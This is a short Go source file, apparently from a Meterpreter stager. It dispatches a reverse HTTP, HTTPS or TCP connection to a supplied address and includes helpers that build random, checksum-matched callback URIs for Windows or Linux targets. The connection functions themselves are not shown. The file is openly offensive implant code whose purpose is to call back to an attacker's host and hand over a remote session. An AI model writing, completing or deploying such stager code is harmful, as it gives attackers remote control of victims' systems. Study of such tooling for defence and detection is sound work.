package meterpreter

import (
	"math/rand"
	"runtime"
	"time"
)

func Meterpreter(connType, address string) (bool, error) {
	var (
		ok  bool
		err error
	)
	switch {
	case connType == "http" || connType == "https":
		ok, err = ReverseHttp(connType, address)
	case connType == "tcp":
		ok, err = ReverseTcp(address)
	default:
		ok = false
	}

	return ok, err
}

func GetRandomString(length int, charset string) string {
	var seed *rand.Rand = rand.New(rand.NewSource(time.Now().UnixNano()))
	buf := make([]byte, length)
	for i := range buf {
		buf[i] = charset[seed.Intn(len(charset))]
	}
	return string(buf)
}

func GetURIChecksumId() int {
	var res int = 0
	switch runtime.GOOS {
	case "windows":
		res = 92
	case "linux":
		res = 95
	default:
		res = 92
	}
	return res
}
